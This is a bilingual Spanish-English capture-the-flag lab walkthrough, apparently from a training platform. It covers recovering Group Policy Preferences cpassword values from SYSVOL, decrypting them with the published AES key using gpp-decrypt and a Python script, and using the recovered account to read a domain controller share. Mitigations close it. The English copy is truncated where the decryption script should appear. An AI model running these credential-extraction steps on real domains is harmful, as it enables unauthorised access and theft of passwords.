Objetivo

El recurso SYSVOL guarda una GPO de despliegue con el atributo cpassword. Descífralo con la clave AES que Microsoft publicó (MS14-025) y usa la contraseña obtenida para leer //DC01/deploy.

Flag: //{{ ad_dc_host }}/deploy/flag-ad-06.txt — captúrala en el Domain Controller y valídala en la caja «Validar Flag» al final de esta página.

Inicio rápido

# Localizar el cpassword en SYSVOL
nxc smb {{ ad_dc_ip }} -u 'svc.readonly' -p 'ReadOnly123!' --spider sysvol --content --pattern 'cpassword'

# Descifrarlo (herramienta dedicada de Kali)
gpp-decrypt '<cpassword>'

1 · Por qué funciona

Las Group Policy Preferences permitían distribuir contraseñas (usuarios locales, unidades mapeadas, tareas programadas). Se guardaban en ficheros XML dentro de SYSVOL, cifradas con AES-256… pero Microsoft publicó la clave en MSDN. Cualquier usuario del dominio puede leer SYSVOL, así que cualquiera puede descifrarlas. Se parcheó en MS14-025, pero los XML antiguos siguen ahí en muchísimos dominios.

2 · Localizar el Groups.xml con el cpassword

No hace falta descargar todo SYSVOL: solo Groups.xml (dentro de Machine\Preferences\Groups\, varios niveles por debajo de Policies\<GUID de la GPO>\) tiene el cpassword. Para encontrar su ruta exacta sin conocer de antemano el GUID de la GPO, usa --spider con --content (imprescindible: sin él --spider solo mira nombres de fichero/carpeta, no el contenido, y no encuentra nada):

nxc smb {{ ad_dc_ip }} -u 'svc.readonly' -p 'ReadOnly123!' \
  --spider sysvol --content --pattern 'cpassword'
# //{{ ad_dc_ip }}/sysvol/{{ ad_realm_lower }}/Policies/{A2B3C4D5-.../Machine/Preferences/Groups/Groups.xml [...pattern:'cpassword']

Esa ruta es remota (en el DC) — --spider solo la imprime en pantalla, no descarga ni guarda nada en tu Kali.

3 · Descargar solo ese fichero

Con la ruta exacta, descarga únicamente Groups.xml (nada más) con --get-file:

nxc smb {{ ad_dc_ip }} -u 'svc.readonly' -p 'ReadOnly123!' --share sysvol \
  --get-file '{{ ad_realm_lower }}\Policies\{A2B3C4D5-1E6F-4A7B-8C9D-0E1F2A3B4C5D}\Machine\Preferences\Groups\Groups.xml' Groups.xml

cat Groups.xml

O de forma manual con smbclient, entrando directamente en la carpeta encontrada (así get Groups.xml lo guarda con nombre limpio, sin arrastrar toda la ruta):

smbclient //{{ ad_dc_ip }}/sysvol -U '{{ ad_domain }}\svc.readonly%ReadOnly123!' \
  -c 'cd {{ ad_realm_lower }}\Policies\{A2B3C4D5-1E6F-4A7B-8C9D-0E1F2A3B4C5D}\Machine\Preferences\Groups\; get Groups.xml'

cat Groups.xml

Ojo: si intentas get con la ruta completa (con barras invertidas) sin haber hecho cd primero, smbclient sí descarga el fichero, pero lo guarda localmente con ese path completo como nombre de fichero literal (no como subcarpetas) — mejor entra en la carpeta con cd o usa --get-file como arriba, que sí permite indicar el nombre local.

4 · Extraer el cpassword

cat Groups.xml
<Groups clsid="...">
  <User name="gpp.deploy" ...>
    <Properties action="U" userName="gpp.deploy"
      cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ"
      .../>
  </User>
</Groups>

5 · Descifrarlo

Nota: el módulo nxc -M gpp_password (búsqueda + descifrado automático en un solo paso) no encuentra el cpassword contra este DC — solo enumera los shares y no llega a recorrer SYSVOL correctamente. Usa gpp-decrypt a mano sobre el cpassword ya extraído en el paso anterior:

gpp-decrypt 'edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ'

Salida: GPPstillStandingStrong2k18

La clave AES pública, por si quieres hacerlo tú mismo:

4e9906e8fcb66cc9faf49310620ffee8f496e806cc057990209b09a433b66c1b

python3 -c "
from Crypto.Cipher import AES
import base64
key = bytes.fromhex('4e9906e8fcb66cc9faf49310620ffee8f496e806cc057990209b09a433b66c1b')
b = 'edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ'
b += '=' * ((4 - len(b) % 4) % 4)
d = AES.new(key, AES.MODE_CBC, b'\x00'*16).decrypt(base64.b64decode(b))
print(d[:-d[-1]].decode('utf-16-le'))
"

6 · Capturar la flag

nxc smb {{ ad_dc_ip }} -u 'gpp.deploy' -p 'GPPstillStandingStrong2k18' --shares

smbclient //{{ ad_dc_ip }}/deploy -U '{{ ad_domain }}\gpp.deploy%GPPstillStandingStrong2k18' -c 'get flag-ad-06.txt'
cat flag-ad-06.txt

Mitigación

  • Aplicar MS14-025 y borrar los XML antiguos de SYSVOL (el parche solo impide crear nuevos).
  • Buscar de forma recurrente cpassword en SYSVOL y rotar cualquier contraseña encontrada.
  • Usar LAPS para las contraseñas de administrador local en lugar de GPP.

Herramientas

gpp-decrypt netexec (nxc) smbclient Get-GPPPassword

1 · Why it works

Group Policy Preferences used to distribute passwords (local users, mapped drives, scheduled tasks). They were stored in XML files inside SYSVOL, encrypted with AES-256… except Microsoft published the key on MSDN. Every domain user can read SYSVOL, so every domain user can decrypt them. Fixed in MS14-025, but the legacy XML files are still sitting there in a huge number of domains.

2 · Locate the Groups.xml with the cpassword

No need to download all of SYSVOL: only Groups.xml (inside Machine\Preferences\Groups\, several levels below Policies\<GPO GUID>\) holds the cpassword. To find its exact path without knowing the GPO's GUID beforehand, use --spider with --content (required: without it --spider only looks at file/folder names, not content, and finds nothing):

nxc smb {{ ad_dc_ip }} -u 'svc.readonly' -p 'ReadOnly123!' \
  --spider sysvol --content --pattern 'cpassword'
# //{{ ad_dc_ip }}/sysvol/{{ ad_realm_lower }}/Policies/{A2B3C4D5-.../Machine/Preferences/Groups/Groups.xml [...pattern:'cpassword']

That path is remote (on the DC) — --spider only prints it to the screen, it doesn't download or save anything on your Kali.

3 · Download just that file

With the exact path, download only Groups.xml (nothing else) with --get-file:

nxc smb {{ ad_dc_ip }} -u 'svc.readonly' -p 'ReadOnly123!' --share sysvol \
  --get-file '{{ ad_realm_lower }}\Policies\{A2B3C4D5-1E6F-4A7B-8C9D-0E1F2A3B4C5D}\Machine\Preferences\Groups\Groups.xml' Groups.xml

cat Groups.xml

Or manually with smbclient, going straight into the folder you found (this way get Groups.xml saves it with a clean name, instead of dragging the whole path along):

smbclient //{{ ad_dc_ip }}/sysvol -U '{{ ad_domain }}\svc.readonly%ReadOnly123!' \
  -c 'cd {{ ad_realm_lower }}\Policies\{A2B3C4D5-1E6F-4A7B-8C9D-0E1F2A3B4C5D}\Machine\Preferences\Groups\; get Groups.xml'

cat Groups.xml

Heads up: if you try get with the full backslash path without cd-ing first, smbclient does download the file, but saves it locally with that whole path as a literal filename (not as subfolders) — better to cd into the folder or use --get-file as above, which lets you set the local name.

4 · Extract the cpassword

cat Groups.xml
<Groups clsid="...">
  <User name="gpp.deploy" ...>
    <Properties action="U" userName="gpp.deploy"
      cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ"
      .../>
  </User>
</Groups>

5 · Decrypt it

Note: the nxc -M gpp_password module (automatic search + decrypt in one step) does not find the cpassword against this DC — it only enumerates the shares and never properly crawls SYSVOL. Use gpp-decrypt by hand on the cpassword you already extracted in the previous step:

gpp-decrypt 'edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ'

Output: GPPstillStandingStrong2k18

The public AES key, in case you want to do it yourself:

import base64

Mitigation

  • Apply MS14-025 and delete the legacy XML files from SYSVOL (the patch only prevents creating new ones).
  • Recurrently grep SYSVOL for cpassword and rotate every password found.
  • Use LAPS for local administrator passwords instead of GPP.
